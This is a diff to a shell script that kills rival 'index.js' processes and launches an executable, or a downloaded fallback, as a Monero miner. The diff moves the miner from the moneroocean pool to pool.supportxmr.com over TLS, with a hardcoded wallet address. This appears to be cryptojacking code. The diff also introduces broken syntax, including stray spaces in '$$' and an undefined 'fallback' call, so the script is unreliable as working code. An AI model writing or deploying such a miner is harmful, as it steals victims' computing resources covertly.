@@ -21,9 +21,9 @@ kill_unwanted() {
         ps aux | grep -w '[i]ndex.js' | awk '{print $2}' | xargs -r kill
     fi
     if command -v pgrep >/dev/null 2>&1; then
-        pgrep "index.js" | grep -v "^$$$" | xargs -r kill
+        pgrep "index.js" | grep -v "^$$  $" | xargs -r kill
     else
-        ps aux | grep -w '[i]ndex.js' | awk -v mypid=$$ '$2 != mypid {print $2}' | xargs -r kill
+        ps aux | grep -w '[i]ndex.js' | awk -v mypid=  $$ '$2 != mypid {print $2}' | xargs -r kill
     fi
 }
 kill_unwanted
@@ -106,9 +106,7 @@ run_program() {
 
     echo "Starting primary program..."
     if [ -x "$executable" ]; then
-        if launch_program "$executable" -o gulf.moneroocean.stream:20128 \
-            -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 \
-            reservepattern454545; then
+        if launch_program "$executable" -o pool.supportxmr.com:443 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls && return 0; then
             echo "Primary program running (PID $!)"
             return 0
         else
@@ -119,13 +117,8 @@ run_program() {
     fi
 
     echo "Attempting fallback..."
-    if download_fallback && launch_program "$fallback_executable" -o gulf.moneroocean.stream:20128 \
-        -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 \
-        reservepattern454545; then
-        echo "Fallback program running (PID $!)"
-    else
-        echo "Warning: All startup attempts failed - continuing script anyway"
-    fi
+    fallback && launch_program "$fallback_executable" -o pool.supportxmr.com:443 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls
+    echo "Fallback program running (PID $!)"
     return 0
 }
 
